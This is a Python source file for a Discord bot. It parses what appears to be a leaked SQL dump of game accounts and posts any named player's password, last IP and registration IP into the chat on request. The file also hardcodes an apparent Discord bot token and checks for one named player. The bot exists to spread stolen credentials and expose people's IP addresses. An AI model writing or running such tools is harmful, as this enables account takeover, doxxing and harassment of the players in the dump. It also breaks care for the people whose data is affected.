import discord
import re
import json

TOKEN = 'MTUxNjEzODgwNDU0NzgxMzUyOA.GUhoBI.wyRCS3mYrZ2-ARc3MUNrqCP_i0XixWA1nIPZ7o'

def parse_sql_values(values_string):
    """Parse SQL VALUES part into a list of values"""
    values = []
    current = []
    in_string = False
    string_char = None
    i = 0
    
    while i < len(values_string):
        char = values_string[i]
        
        # Handle string start/end
        if char in ("'", '"') and (i == 0 or values_string[i-1] != '\\'):
            if not in_string:
                in_string = True
                string_char = char
                current.append(char)
            elif char == string_char:
                in_string = False
                current.append(char)
            else:
                current.append(char)
        # Handle commas (field separators)
        elif char == ',' and not in_string:
            values.append(''.join(current).strip())
            current = []
        else:
            current.append(char)
        
        i += 1
    
    # Add the last value
    if current:
        values.append(''.join(current).strip())
    
    # Clean up values (remove quotes and handle NULL)
    cleaned = []
    for v in values:
        v = v.strip()
        if v.startswith(("'", '"')) and v.endswith(("'", '"')):
            v = v[1:-1]
        if v.upper() == 'NULL' or v == '':
            v = 'Unknown'
        cleaned.append(v)
    
    return cleaned

def load_accounts_from_sql():
    accounts = {}
    
    try:
        # Read the entire file
        with open('grp26.txt', 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
        
        # Method 1: Find all INSERT statements using multiple patterns
        patterns = [
            r"INSERT\s+INTO\s+`?accounts`?\s+VALUES\s*\(([^;]+?)\)\s*;",
            r"INSERT\s+INTO\s+`?accounts`?\s*\([^)]+\)\s*VALUES\s*\(([^;]+?)\)\s*;",
            r"INSERT\s+INTO\s+`?players`?\s+VALUES\s*\(([^;]+?)\)\s*;",
            r"INSERT\s+INTO\s+`?players`?\s*\([^)]+\)\s*VALUES\s*\(([^;]+?)\)\s*;",
        ]
        
        all_matches = []
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
            if matches:
                all_matches.extend(matches)
                print(f"Found {len(matches)} matches with pattern: {pattern[:50]}...")
        
        # If no matches with patterns, try line by line
        if not all_matches:
            print("Trying line-by-line parsing...")
            lines = content.split('\n')
            for line in lines:
                if 'INSERT' in line.upper() and ('accounts' in line.lower() or 'players' in line.lower()):
                    values_match = re.search(r'VALUES\s*\((.*?)\)\s*;', line, re.IGNORECASE)
                    if values_match:
                        all_matches.append(values_match.group(1))
        
        print(f"Total value sets to parse: {len(all_matches)}")
        
        # Parse each match
        for values_str in all_matches:
            values = parse_sql_values(values_str)
            
            if len(values) < 2:
                continue
            
            # Try to identify which field is the username
            # Username is typically a string that's not all numbers and contains letters
            username = None
            password = None
            last_ip = None
            reg_ip = None
            
            # Check each possible column position
            for idx, val in enumerate(values):
                if val and val != 'Unknown':
                    # Check if this looks like a username
                    if not val.isdigit() and len(val) > 2 and '.' not in val and ':' not in val:
                        # This is likely a username
                        username = val
                        # Password is usually next column
                        if idx + 1 < len(values):
                            password = values[idx + 1]
                        # IPs are usually 2-3 columns after
                        if idx + 3 < len(values):
                            last_ip = values[idx + 3]
                        if idx + 4 < len(values):
                            reg_ip = values[idx + 4]
                        break
            
            # Alternative: If table has ID column first
            if not username and len(values) >= 3:
                # Check if second column looks like username
                if values[1] and not values[1].isdigit() and len(values[1]) > 2:
                    username = values[1]
                    password = values[2] if len(values) > 2 else 'Unknown'
                    last_ip = values[4] if len(values) > 4 else 'Unknown'
                    reg_ip = values[5] if len(values) > 5 else 'Unknown'
            
            # Another alternative: First column might be username
            if not username and len(values) >= 2:
                if values[0] and not values[0].isdigit() and len(values[0]) > 2:
                    username = values[0]
                    password = values[1] if len(values) > 1 else 'Unknown'
                    last_ip = values[3] if len(values) > 3 else 'Unknown'
                    reg_ip = values[4] if len(values) > 4 else 'Unknown'
            
            # Store if we found a valid username
            if username and username != 'Unknown':
                accounts[username.lower()] = {
                    'playerName': username,
                    'Password': password if password and password != 'Unknown' else 'No password',
                    'LastIP': last_ip if last_ip and last_ip != 'Unknown' else '0.0.0.0',
                    'RegIP': reg_ip if reg_ip and reg_ip != 'Unknown' else '0.0.0.0'
                }
        
        # Method 2: Direct regex extraction for common patterns
        if len(accounts) < 100:  # If we got very few accounts, try another method
            print("Trying direct regex extraction...")
            
            # Pattern for: (id, 'username', 'password', ...)
            pattern = r"\(\d+,\s*'([^']+)',\s*'([^']+)',\s*[^,]*,\s*'([^']*)',\s*'([^']*)'"
            matches = re.findall(pattern, content)
            
            for match in matches:
                if len(match) >= 2:
                    username = match[0]
                    password = match[1] if len(match) > 1 else 'Unknown'
                    last_ip = match[2] if len(match) > 2 else 'Unknown'
                    reg_ip = match[3] if len(match) > 3 else 'Unknown'
                    
                    if username:
                        accounts[username.lower()] = {
                            'playerName': username,
                            'Password': password,
                            'LastIP': last_ip if last_ip else '0.0.0.0',
                            'RegIP': reg_ip if reg_ip else '0.0.0.0'
                        }
        
        return accounts
        
    except Exception as e:
        print(f"Error loading accounts: {e}")
        import traceback
        traceback.print_exc()
        return {}

# Load accounts
accounts = load_accounts_from_sql()
print(f"\n✅ Successfully loaded {len(accounts)} accounts")

# Verify Nika_Joestar is loaded
if 'nika_joestar' in accounts:
    print("\n✅ Nika_Joestar found in database!")
    print(f"   Data: {accounts['nika_joestar']}")
else:
    print("\n❌ Nika_Joestar not found in loaded accounts")
    
    # Search for it in raw file
    try:
        with open('grp26.txt', 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if 'Nika_Joestar' in content:
                print("   But 'Nika_Joestar' exists in the file!")
                # Find the line containing it
                for line in content.split('\n'):
                    if 'Nika_Joestar' in line:
                        print(f"   Line: {line[:200]}")
                        break
    except:
        pass

# Show sample of loaded accounts
if accounts:
    print(f"\n📋 Sample of loaded accounts (showing first 10):")
    for i, (name, data) in enumerate(list(accounts.items())[:10]):
        print(f"  {i+1}. {data['playerName']} - Pass: {data['Password'][:15]} - LastIP: {data['LastIP']}")
else:
    print("\n❌ No accounts were loaded! Please check:")
    print("   1. Is the file named 'grp26.txt'?")
    print("   2. Does it contain SQL INSERT statements?")
    print("   3. Run the debug script first to see the format")

intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Bot is online as {bot.user}')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    raw_content = message.content.strip()
    
    if raw_content == '!stats':
        await message.channel.send(f"📊 Total accounts in database: {len(accounts)}")
        return
    
    # Remove bot mention
    cleaned_content = re.sub(r'<@!?(\d+)>', '', raw_content).strip()
    
    if not cleaned_content:
        return
    
    username = cleaned_content
    
    if username.lower() in accounts:
        player = accounts[username.lower()]
        await message.channel.send(
            f"```\n"
            f"👤 Name: {player['playerName']}\n"
            f"🔑 Password: {player['Password']}\n"
            f"🌐 Last IP: {player['LastIP']}\n"
            f"📝 Reg IP: {player['RegIP']}\n"
            f"```"
        )
    else:
        # Show similar names
        similar = []
        for name, data in accounts.items():
            if username.lower() in name or name.startswith(username.lower()[:3]):
                similar.append(data['playerName'])
                if len(similar) >= 5:
                    break
        
        if similar:
            suggestions = ", ".join(similar[:5])
            await message.channel.send(f"❌ Player '{username}' not found. Did you mean: {suggestions}?")
        else:
            await message.channel.send(f"❌ Player '{username}' not found in database")

bot.run(TOKEN)